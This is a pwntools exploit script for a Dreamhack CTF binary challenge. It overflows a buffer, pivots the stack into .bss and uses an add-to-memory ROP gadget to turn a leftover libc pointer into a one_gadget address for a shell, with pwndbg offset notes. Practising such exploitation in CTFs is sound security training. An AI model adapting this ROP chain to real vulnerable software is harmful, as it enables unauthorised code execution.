#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './prob_patched'
HOST = 'host8.dreamhack.games'
PORT = 19341

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x0000000000401145
b*0x000000000040115e
b*0x0000000000401163
c
c
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================

# 0x6320f

# 0x404960:       0x0000000000000000      0x00007812ba419aa0
# pwndbg> p/x 0x00007812ba419aa0-0x7812ba200000
# $1 = 0x219aa0
# pwndbg> p/x 0xebd52-0x219aa0  
# $2 = 0xffed22b2 (+ 0xa0 lol)
# pwndbg> p/x 0x404968+0x3d
# $3 = 0x4049a5

# pop start at 0x4048f8
# ld base at 0x404918 w saved rbp at 0x4049f8

# ROP GADGETS
add_rbp = 0x000000000040111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
leave_ret = 0x0000000000401168
ret = 0x000000000040101a
mov_eax_0 = 0x0000000000401163
pop_rbp = 0x000000000040111d
main = 0x0000000000401145

# stack pivot
pause()

sl(b'A' * 0x100 + p64(0x404a00) + p64(main))
pause()
sl(b'B' * 0x100 + p64(0x4049f8) + p64(main))
pause()
payload = flat(
    0xffed2352,
    p64(0x0) * 4,
    0x4049a5,
    add_rbp,
    ret, ret, ret, ret, ret, ret, ret
)
sl(payload)

p.interactive()
